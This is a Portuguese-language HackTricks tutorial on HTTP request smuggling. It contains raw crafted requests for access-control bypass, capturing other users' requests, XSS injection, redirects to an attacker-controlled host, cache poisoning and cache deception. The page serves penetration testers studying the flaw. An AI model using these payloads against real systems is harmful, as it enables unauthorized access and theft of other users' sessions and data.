# HTTP Request Smuggling / HTTP Desync Attack

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## O que √©

Essa vulnerabilidade ocorre quando uma **desincroniza√ß√£o** entre os **proxies de front-end** e o servidor **back-end** permite que um **atacante** **envie** uma **requisi√ß√£o** HTTP que ser√° **interpretada** como uma **√∫nica requisi√ß√£o** pelos proxies de **front-end** (balanceador de carga/reverse-proxy) e **como 2 requisi√ß√µes** pelo servidor **back-end**.\
Isso permite que um usu√°rio **modifique a pr√≥xima requisi√ß√£o que chega ao servidor back-end ap√≥s a sua**.

### Teoria

[**Especifica√ß√£o RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Se uma mensagem for recebida com um campo de cabe√ßalho Transfer-Encoding e um campo de cabe√ßalho Content-Length, o √∫ltimo DEVE ser ignorado.

**Content-Length**

> O cabe√ßalho de entidade Content-Length indica o tamanho do corpo da entidade, em bytes, enviado ao destinat√°rio.

**Transfer-Encoding: chunked**

> O cabe√ßalho Transfer-Encoding especifica a forma de codifica√ß√£o usada para transferir com seguran√ßa o corpo da carga √∫til para o usu√°rio.\
> Chunked significa que grandes dados s√£o enviados em uma s√©rie de peda√ßos.

### Realidade

O **Front-End** (um balanceador de carga / Reverse Proxy) **processa** o cabe√ßalho _**content-length**_ ou o _**transfer-encoding**_ e o servidor **Back-end** **processa o outro**, provocando uma **desincroniza√ß√£o** entre os 2 sistemas.\
Isso pode ser muito cr√≠tico, pois **um atacante poder√° enviar uma requisi√ß√£o** para o reverse proxy que ser√° **interpretada** pelo servidor **back-end** **como 2 requisi√ß√µes diferentes**. O **perigo** dessa t√©cnica reside no fato de que o servidor **back-end** **interpretar√°** a **2¬™ requisi√ß√£o injetada** como se **tivesse vindo do pr√≥ximo cliente** e a **requisi√ß√£o real** desse cliente ser√° **parte** da **requisi√ß√£o injetada**.

### Particularidades

Lembre-se de que em HTTP **um caractere de nova linha √© composto por 2 bytes:**

* **Content-Length**: Este cabe√ßalho usa um **n√∫mero decimal** para indicar o **n√∫mero** de **bytes** do **corpo** da requisi√ß√£o. O corpo deve terminar no √∫ltimo caractere, **uma nova linha n√£o √© necess√°ria no final da requisi√ß√£o**.
* **Transfer-Encoding:** Este cabe√ßalho usa no **corpo** um **n√∫mero hexadecimal** para indicar o **n√∫mero** de **bytes** do **pr√≥ximo peda√ßo**. O **peda√ßo** deve **terminar** com uma **nova linha**, mas essa nova linha **n√£o √© contada** pelo indicador de comprimento. Este m√©todo de transfer√™ncia deve terminar com um **peda√ßo de tamanho 0 seguido por 2 novas linhas**: `0`
* **Connection**: Com base na minha experi√™ncia, √© recomendado usar **`Connection: keep-alive`** na primeira requisi√ß√£o do Request Smuggling.

## Exemplos B√°sicos

{% hint style="success" %}
Ao tentar explorar isso com Burp Suite **desative `Update Content-Length` e `Normalize HTTP/1 line endings`** no repetidor, pois alguns gadgets abusam de novas linhas, retornos de carro e content-lengths malformados.
{% endhint %}

Os ataques de HTTP request smuggling s√£o elaborados enviando requisi√ß√µes amb√≠guas que exploram discrep√¢ncias em como os servidores de front-end e back-end interpretam os cabe√ßalhos `Content-Length` (CL) e `Transfer-Encoding` (TE). Esses ataques podem se manifestar de diferentes formas, principalmente como **CL.TE**, **TE.CL** e **TE.TE**. Cada tipo representa uma combina√ß√£o √∫nica de como os servidores de front-end e back-end priorizam esses cabe√ßalhos. As vulnerabilidades surgem do processamento da mesma requisi√ß√£o pelos servidores de maneiras diferentes, levando a resultados inesperados e potencialmente maliciosos.

### Exemplos B√°sicos de Tipos de Vulnerabilidade

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### Vulnerabilidade CL.TE (Content-Length usado pelo Front-End, Transfer-Encoding usado pelo Back-End)

* **Front-End (CL):** Processa a requisi√ß√£o com base no cabe√ßalho `Content-Length`.
* **Back-End (TE):** Processa a requisi√ß√£o com base no cabe√ßalho `Transfer-Encoding`.
* **Cen√°rio de Ataque:**
* O atacante envia uma requisi√ß√£o onde o valor do cabe√ßalho `Content-Length` n√£o corresponde ao comprimento real do conte√∫do.
* O servidor de front-end encaminha toda a requisi√ß√£o para o back-end, com base no valor de `Content-Length`.
* O servidor back-end processa a requisi√ß√£o como chunked devido ao cabe√ßalho `Transfer-Encoding: chunked`, interpretando os dados restantes como uma requisi√ß√£o separada e subsequente.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Vulnerabilidade TE.CL (Transfer-Encoding usado pelo Front-End, Content-Length usado pelo Back-End)

* **Front-End (TE):** Processa a requisi√ß√£o com base no cabe√ßalho `Transfer-Encoding`.
* **Back-End (CL):** Processa a requisi√ß√£o com base no cabe√ßalho `Content-Length`.
* **Cen√°rio de Ataque:**
* O atacante envia uma requisi√ß√£o chunked onde o tamanho do peda√ßo (`7b`) e o comprimento real do conte√∫do (`Content-Length: 4`) n√£o se alinham.
* O servidor de front-end, respeitando `Transfer-Encoding`, encaminha toda a requisi√ß√£o para o back-end.
* O servidor back-end, respeitando `Content-Length`, processa apenas a parte inicial da requisi√ß√£o (`7b` bytes), deixando o restante como parte de uma requisi√ß√£o subsequente n√£o intencional.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### Vulnerabilidade TE.TE (Transfer-Encoding usado por ambos, com ofusca√ß√£o)

* **Servidores:** Ambos suportam `Transfer-Encoding`, mas um pode ser enganado para ignor√°-lo via ofusca√ß√£o.
* **Cen√°rio de Ataque:**
* O atacante envia uma requisi√ß√£o com cabe√ßalhos `Transfer-Encoding` ofuscados.
* Dependendo de qual servidor (front-end ou back-end) falha em reconhecer a ofusca√ß√£o, uma vulnerabilidade CL.TE ou TE.CL pode ser explorada.
* A parte n√£o processada da requisi√ß√£o, como vista por um dos servidores, torna-se parte de uma requisi√ß√£o subsequente, levando ao smuggling.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Cen√°rio CL.CL (Content-Length usado por ambos Front-End e Back-End):**

* Ambos os servidores processam a requisi√ß√£o com base apenas no cabe√ßalho `Content-Length`.
* Este cen√°rio normalmente n√£o leva ao smuggling, pois h√° alinhamento em como ambos os servidores interpretam o comprimento da requisi√ß√£o.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **Cen√°rio CL != 0:**

* Refere-se a cen√°rios onde o cabe√ßalho `Content-Length` est√° presente e tem um valor diferente de zero, indicando que o corpo da requisi√ß√£o tem conte√∫do.
* √â crucial para entender e elaborar ataques de smuggling, pois influencia como os servidores determinam o final de uma requisi√ß√£o.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### Quebrando o servidor web

Essa t√©cnica tamb√©m √© √∫til em cen√°rios onde √© poss√≠vel **quebrar um servidor web enquanto l√™ os dados HTTP iniciais** mas **sem fechar a conex√£o**. Dessa forma, o **corpo** da requisi√ß√£o HTTP ser√° considerado a **pr√≥xima requisi√ß√£o HTTP**.

Por exemplo, como explicado em [**este writeup**](https://mizu.re/post/twisty-python), no Werkzeug foi poss√≠vel enviar alguns **caracteres Unicode** e isso far√° o servidor **quebrar**. No entanto, se a conex√£o HTTP foi criada com o cabe√ßalho **`Connection: keep-alive`**, o corpo da requisi√ß√£o n√£o ser√° lido e a conex√£o ainda estar√° aberta, ent√£o o **corpo** da requisi√ß√£o ser√° tratado como a **pr√≥xima requisi√ß√£o HTTP**.

#### For√ßando via cabe√ßalhos hop-by-hop

Abusando cabe√ßalhos hop-by-hop, voc√™ poderia indicar ao proxy para **deletar o cabe√ßalho Content-Length ou Transfer-Encoding para que um HTTP request smuggling seja poss√≠vel de abusar**.
```
Connection: Content-Length
```
Para **mais informa√ß√µes sobre cabe√ßalhos hop-by-hop** visite:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Encontrando HTTP Request Smuggling

Identificar vulnerabilidades de HTTP request smuggling pode frequentemente ser alcan√ßado usando t√©cnicas de temporiza√ß√£o, que dependem da observa√ß√£o de quanto tempo leva para o servidor responder a solicita√ß√µes manipuladas. Essas t√©cnicas s√£o particularmente √∫teis para detectar vulnerabilidades CL.TE e TE.CL. Al√©m desses m√©todos, existem outras estrat√©gias e ferramentas que podem ser usadas para encontrar tais vulnerabilidades:

### Encontrando Vulnerabilidades CL.TE Usando T√©cnicas de Temporiza√ß√£o

* **M√©todo:**
* Enviar uma solicita√ß√£o que, se a aplica√ß√£o for vulner√°vel, far√° com que o servidor back-end aguarde dados adicionais.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Observa√ß√£o:**
* O servidor front-end processa a solicita√ß√£o com base em `Content-Length` e corta a mensagem prematuramente.
* O servidor back-end, esperando uma mensagem em partes, aguarda o pr√≥ximo peda√ßo que nunca chega, causando um atraso.
* **Indicadores:**
* Timeouts ou longos atrasos na resposta.
* Recebendo um erro 400 Bad Request do servidor back-end, √†s vezes com informa√ß√µes detalhadas do servidor.

### Encontrando Vulnerabilidades TE.CL Usando T√©cnicas de Temporiza√ß√£o

* **M√©todo:**
* Enviar uma solicita√ß√£o que, se a aplica√ß√£o for vulner√°vel, far√° com que o servidor back-end aguarde dados adicionais.
*   **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Observa√ß√£o:**
* O servidor front-end processa a solicita√ß√£o com base em `Transfer-Encoding` e encaminha toda a mensagem.
* O servidor back-end, esperando uma mensagem com base em `Content-Length`, aguarda dados adicionais que nunca chegam, causando um atraso.

### Outros M√©todos para Encontrar Vulnerabilidades

* **An√°lise de Resposta Diferencial:**
* Enviar vers√µes ligeiramente variadas de uma solicita√ß√£o e observar se as respostas do servidor diferem de uma maneira inesperada, indicando uma discrep√¢ncia de an√°lise.
* **Usando Ferramentas Automatizadas:**
* Ferramentas como a extens√£o 'HTTP Request Smuggler' do Burp Suite podem testar automaticamente essas vulnerabilidades enviando v√°rias formas de solicita√ß√µes amb√≠guas e analisando as respostas.
* **Testes de Varia√ß√£o de Content-Length:**
* Enviar solicita√ß√µes com valores de `Content-Length` variados que n√£o est√£o alinhados com o comprimento real do conte√∫do e observar como o servidor lida com tais incompatibilidades.
* **Testes de Varia√ß√£o de Transfer-Encoding:**
* Enviar solicita√ß√µes com cabe√ßalhos `Transfer-Encoding` ofuscados ou malformados e monitorar como os servidores front-end e back-end respondem de maneira diferente a tais manipula√ß√µes.

### Teste de Vulnerabilidade de HTTP Request Smuggling

Ap√≥s confirmar a efic√°cia das t√©cnicas de temporiza√ß√£o, √© crucial verificar se as solicita√ß√µes do cliente podem ser manipuladas. Um m√©todo simples √© tentar envenenar suas solicita√ß√µes, por exemplo, fazendo uma solicita√ß√£o para `/` resultar em uma resposta 404. Os exemplos `CL.TE` e `TE.CL` discutidos anteriormente em [Exemplos B√°sicos](./#basic-examples) demonstram como envenenar a solicita√ß√£o de um cliente para provocar uma resposta 404, apesar de o cliente estar tentando acessar um recurso diferente.

**Considera√ß√µes Chave**

Ao testar vulnerabilidades de request smuggling interferindo em outras solicita√ß√µes, tenha em mente:

* **Conex√µes de Rede Distintas:** As solicita√ß√µes "ataque" e "normais" devem ser enviadas por conex√µes de rede separadas. Utilizar a mesma conex√£o para ambas n√£o valida a presen√ßa da vulnerabilidade.
* **URL e Par√¢metros Consistentes:** Procure usar URLs e nomes de par√¢metros id√™nticos para ambas as solicita√ß√µes. Aplica√ß√µes modernas frequentemente roteiam solicita√ß√µes para servidores back-end espec√≠ficos com base em URL e par√¢metros. Correspondendo a esses aumenta a probabilidade de que ambas as solicita√ß√µes sejam processadas pelo mesmo servidor, um pr√©-requisito para um ataque bem-sucedido.
* **Condi√ß√µes de Temporiza√ß√£o e Corrida:** A solicita√ß√£o "normal", destinada a detectar interfer√™ncia da solicita√ß√£o "ataque", compete contra outras solicita√ß√µes de aplica√ß√£o concorrentes. Portanto, envie a solicita√ß√£o "normal" imediatamente ap√≥s a solicita√ß√£o "ataque". Aplica√ß√µes ocupadas podem exigir v√°rias tentativas para confirma√ß√£o conclusiva da vulnerabilidade.
* **Desafios de Balanceamento de Carga:** Servidores front-end atuando como balanceadores de carga podem distribuir solicita√ß√µes entre v√°rios sistemas back-end. Se as solicita√ß√µes "ataque" e "normais" acabarem em sistemas diferentes, o ataque n√£o ter√° sucesso. Esse aspecto de balanceamento de carga pode exigir v√°rias tentativas para confirmar uma vulnerabilidade.
* **Impacto N√£o Intencional no Usu√°rio:** Se seu ataque impactar inadvertidamente a solicita√ß√£o de outro usu√°rio (n√£o a solicita√ß√£o "normal" que voc√™ enviou para detec√ß√£o), isso indica que seu ataque influenciou outro usu√°rio da aplica√ß√£o. Testes cont√≠nuos podem interromper outros usu√°rios, exigindo uma abordagem cautelosa.

## Abusando de HTTP Request Smuggling

### Contornando a Seguran√ßa do Front-End via HTTP Request Smuggling

√Äs vezes, proxies front-end imp√µem medidas de seguran√ßa, examinando solicita√ß√µes de entrada. No entanto, essas medidas podem ser contornadas explorando HTTP Request Smuggling, permitindo acesso n√£o autorizado a endpoints restritos. Por exemplo, acessar `/admin` pode ser proibido externamente, com o proxy front-end bloqueando ativamente tais tentativas. No entanto, esse proxy pode negligenciar inspecionar solicita√ß√µes embutidas dentro de uma solicita√ß√£o HTTP contrabandeada, deixando uma brecha para contornar essas restri√ß√µes.

Considere os seguintes exemplos que ilustram como HTTP Request Smuggling pode ser usado para contornar controles de seguran√ßa do front-end, especificamente visando o caminho `/admin`, que geralmente √© protegido pelo proxy front-end:

**Exemplo CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
No ataque CL.TE, o cabe√ßalho `Content-Length` √© utilizado para a solicita√ß√£o inicial, enquanto a solicita√ß√£o incorporada subsequente utiliza o cabe√ßalho `Transfer-Encoding: chunked`. O proxy de front-end processa a solicita√ß√£o `POST` inicial, mas falha em inspecionar a solicita√ß√£o incorporada `GET /admin`, permitindo acesso n√£o autorizado ao caminho `/admin`.

**TE.CL Exemplo**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Por outro lado, no ataque TE.CL, a solicita√ß√£o inicial `POST` usa `Transfer-Encoding: chunked`, e a solicita√ß√£o incorporada subsequente √© processada com base no cabe√ßalho `Content-Length`. Semelhante ao ataque CL.TE, o proxy de front-end ignora a solicita√ß√£o `GET /admin` contrabandeada, concedendo inadvertidamente acesso ao caminho restrito `/admin`.

### Revelando reescrita de solicita√ß√µes de front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

As aplica√ß√µes frequentemente utilizam um **servidor de front-end** para modificar solicita√ß√µes recebidas antes de pass√°-las para o servidor de back-end. Uma modifica√ß√£o t√≠pica envolve a adi√ß√£o de cabe√ßalhos, como `X-Forwarded-For: <IP do cliente>`, para relatar o IP do cliente ao back-end. Compreender essas modifica√ß√µes pode ser crucial, pois pode revelar maneiras de **contornar prote√ß√µes** ou **descobrir informa√ß√µes ou endpoints ocultos**.

Para investigar como um proxy altera uma solicita√ß√£o, localize um par√¢metro POST que o back-end ecoa na resposta. Em seguida, elabore uma solicita√ß√£o, usando este par√¢metro por √∫ltimo, semelhante ao seguinte:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Nesta estrutura, os componentes de solicita√ß√£o subsequentes s√£o anexados ap√≥s `search=`, que √© o par√¢metro refletido na resposta. Essa reflex√£o expor√° os cabe√ßalhos da solicita√ß√£o subsequente.

√â importante alinhar o cabe√ßalho `Content-Length` da solicita√ß√£o aninhada com o comprimento real do conte√∫do. Come√ßar com um valor pequeno e aumentar gradualmente √© aconselh√°vel, pois um valor muito baixo truncar√° os dados refletidos, enquanto um valor muito alto pode causar um erro na solicita√ß√£o.

Essa t√©cnica tamb√©m √© aplic√°vel no contexto de uma vulnerabilidade TE.CL, mas a solicita√ß√£o deve terminar com `search=\r\n0`. Independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de busca.

Este m√©todo serve principalmente para entender as modifica√ß√µes na solicita√ß√£o feitas pelo proxy de front-end, essencialmente realizando uma investiga√ß√£o autodirigida.

### Capturando as solicita√ß√µes de outros usu√°rios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

√â vi√°vel capturar as solicita√ß√µes do pr√≥ximo usu√°rio anexando uma solicita√ß√£o espec√≠fica como o valor de um par√¢metro durante uma opera√ß√£o POST. Veja como isso pode ser realizado:

Ao anexar a seguinte solicita√ß√£o como o valor de um par√¢metro, voc√™ pode armazenar a solicita√ß√£o do cliente subsequente:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Neste cen√°rio, o **par√¢metro de coment√°rio** destina-se a armazenar o conte√∫do na se√ß√£o de coment√°rios de um post em uma p√°gina acess√≠vel publicamente. Consequentemente, o conte√∫do da solicita√ß√£o subsequente aparecer√° como um coment√°rio.

No entanto, essa t√©cnica tem limita√ß√µes. Geralmente, ela captura dados apenas at√© o delimitador de par√¢metro usado na solicita√ß√£o contrabandeada. Para envios de formul√°rios codificados em URL, esse delimitador √© o caractere `&`. Isso significa que o conte√∫do capturado da solicita√ß√£o do usu√°rio v√≠tima parar√° no primeiro `&`, que pode at√© fazer parte da string de consulta.

Al√©m disso, vale a pena notar que essa abordagem tamb√©m √© vi√°vel com uma vulnerabilidade TE.CL. Nesses casos, a solicita√ß√£o deve terminar com `search=\r\n0`. Independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de busca.

### Usando o HTTP request smuggling para explorar XSS refletido

HTTP Request Smuggling pode ser aproveitado para explorar p√°ginas da web vulner√°veis a **XSS Refletido**, oferecendo vantagens significativas:

* A intera√ß√£o com os usu√°rios-alvo **n√£o √© necess√°ria**.
* Permite a explora√ß√£o de XSS em partes da solicita√ß√£o que s√£o **normalmente inalcan√ß√°veis**, como cabe√ßalhos de solicita√ß√£o HTTP.

Em cen√°rios onde um site √© suscet√≠vel a XSS Refletido atrav√©s do cabe√ßalho User-Agent, a seguinte carga √∫til demonstra como explorar essa vulnerabilidade:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Este payload √© estruturado para explorar a vulnerabilidade da seguinte forma:

1. Iniciando uma requisi√ß√£o `POST`, aparentemente t√≠pica, com um cabe√ßalho `Transfer-Encoding: chunked` para indicar o in√≠cio do smuggling.
2. Seguindo com um `0`, marcando o fim do corpo da mensagem chunked.
3. Em seguida, uma requisi√ß√£o `GET` √© introduzida, onde o cabe√ßalho `User-Agent` √© injetado com um script, `<script>alert(1)</script>`, acionando o XSS quando o servidor processa esta requisi√ß√£o subsequente.

Ao manipular o `User-Agent` atrav√©s do smuggling, o payload contorna as restri√ß√µes normais de requisi√ß√£o, explorando assim a vulnerabilidade de XSS Refletido de uma maneira n√£o padr√£o, mas eficaz.

#### HTTP/0.9

{% hint style="danger" %}
Caso o conte√∫do do usu√°rio seja refletido em uma resposta com um **`Content-type`** como **`text/plain`**, impedindo a execu√ß√£o do XSS. Se o servidor suportar **HTTP/0.9, pode ser poss√≠vel contornar isso**!
{% endhint %}

A vers√£o HTTP/0.9 era anterior √† 1.0 e usa apenas verbos **GET** e **n√£o** responde com **cabe√ßalhos**, apenas o corpo.

Em [**este writeup**](https://mizu.re/post/twisty-python), isso foi abusado com um request smuggling e um **endpoint vulner√°vel que ir√° responder com a entrada do usu√°rio** para smuggling uma requisi√ß√£o com HTTP/0.9. O par√¢metro que ser√° refletido na resposta continha uma **resposta HTTP/1.1 falsa (com cabe√ßalhos e corpo)**, de modo que a resposta conter√° c√≥digo JS execut√°vel v√°lido com um `Content-Type` de `text/html`.

### Explorando Redirecionamentos no Local com HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

As aplica√ß√µes frequentemente redirecionam de uma URL para outra usando o hostname do cabe√ßalho `Host` na URL de redirecionamento. Isso √© comum em servidores web como Apache e IIS. Por exemplo, solicitar uma pasta sem uma barra no final resulta em um redirecionamento para incluir a barra:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Resultados em:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Embora aparentemente inofensivo, esse comportamento pode ser manipulado usando HTTP request smuggling para redirecionar usu√°rios para um site externo. Por exemplo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Este pedido contrabandeado poderia fazer com que o pr√≥ximo pedido de usu√°rio processado fosse redirecionado para um site controlado pelo atacante:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Resultados em:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
Neste cen√°rio, o pedido de um usu√°rio por um arquivo JavaScript √© sequestrado. O atacante pode potencialmente comprometer o usu√°rio servindo JavaScript malicioso em resposta.

### Explora√ß√£o de Envenenamento de Cache Web via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

O envenenamento de cache web pode ser executado se qualquer componente da **infraestrutura de front-end armazenar conte√∫do em cache**, tipicamente para melhorar o desempenho. Ao manipular a resposta do servidor, √© poss√≠vel **envenenar o cache**.

Anteriormente, observamos como as respostas do servidor poderiam ser alteradas para retornar um erro 404 (consulte [Exemplos B√°sicos](./#basic-examples)). Da mesma forma, √© vi√°vel enganar o servidor para entregar o conte√∫do de `/index.html` em resposta a um pedido por `/static/include.js`. Consequentemente, o conte√∫do de `/static/include.js` √© substitu√≠do no cache pelo de `/index.html`, tornando `/static/include.js` inacess√≠vel aos usu√°rios, potencialmente levando a uma Nega√ß√£o de Servi√ßo (DoS).

Essa t√©cnica se torna particularmente poderosa se uma **vulnerabilidade de Redirecionamento Aberto** for descoberta ou se houver um **redirecionamento no site para um redirecionamento aberto**. Tais vulnerabilidades podem ser exploradas para substituir o conte√∫do em cache de `/static/include.js` por um script sob o controle do atacante, essencialmente permitindo um ataque generalizado de Cross-Site Scripting (XSS) contra todos os clientes que solicitam o `/static/include.js` atualizado.

Abaixo est√° uma ilustra√ß√£o da explora√ß√£o de **envenenamento de cache combinado com um redirecionamento no site para redirecionamento aberto**. O objetivo √© alterar o conte√∫do do cache de `/static/include.js` para servir c√≥digo JavaScript controlado pelo atacante:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Note o pedido embutido direcionado a `/post/next?postId=3`. Este pedido ser√° redirecionado para `/post?postId=4`, utilizando o **valor do cabe√ßalho Host** para determinar o dom√≠nio. Ao alterar o **cabe√ßalho Host**, o atacante pode redirecionar o pedido para seu dom√≠nio (**redirecionamento no site para redirecionamento aberto**).

Ap√≥s um **envenenamento de socket** bem-sucedido, um **pedido GET** para `/static/include.js` deve ser iniciado. Este pedido ser√° contaminado pelo anterior pedido de **redirecionamento no site para redirecionamento aberto** e buscar√° o conte√∫do do script controlado pelo atacante.

Subsequentemente, qualquer pedido para `/static/include.js` servir√° o conte√∫do em cache do script do atacante, efetivamente lan√ßando um amplo ataque XSS.

### Usando HTTP request smuggling para realizar engano de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Qual √© a diferen√ßa entre envenenamento de cache web e engano de cache web?**
>
> * No **envenenamento de cache web**, o atacante faz com que a aplica√ß√£o armazene algum conte√∫do malicioso no cache, e esse conte√∫do √© servido do cache para outros usu√°rios da aplica√ß√£o.
> * No **engano de cache web**, o atacante faz com que a aplica√ß√£o armazene algum conte√∫do sens√≠vel pertencente a outro usu√°rio no cache, e o atacante ent√£o recupera esse conte√∫do do cache.

O atacante cria um pedido contrabandeado que busca conte√∫do sens√≠vel espec√≠fico do usu√°rio. Considere o seguinte exemplo:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Se esta solicita√ß√£o contrabandeada envenenar uma entrada de cache destinada a conte√∫do est√°tico (por exemplo, `/someimage.png`), os dados sens√≠veis da v√≠tima de `/private/messages` podem ser armazenados em cache sob a entrada de cache do conte√∫do est√°tico. Consequentemente, o atacante poderia potencialmente recuperar esses dados sens√≠veis armazenados em cache.

### Abusando do TRACE via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**Neste post**](https://portswigger.net/research/trace-desync-attack) √© sugerido que, se o servidor tiver o m√©todo TRACE habilitado, pode ser poss√≠vel abusar dele com um HTTP Request Smuggling. Isso ocorre porque esse m√©todo refletir√° qualquer cabe√ßalho enviado ao servidor como parte do corpo da resposta. Por exemplo:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Vou enviar uma resposta como:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Um exemplo de como abusar desse comportamento seria **contrabandear primeiro um pedido HEAD**. Este pedido ser√° respondido apenas com os **cabe√ßalhos** de um pedido GET (**`Content-Type`** entre eles). E contrabandear **imediatamente ap√≥s o HEAD um pedido TRACE**, que ir√° **refletir os dados enviados**.\
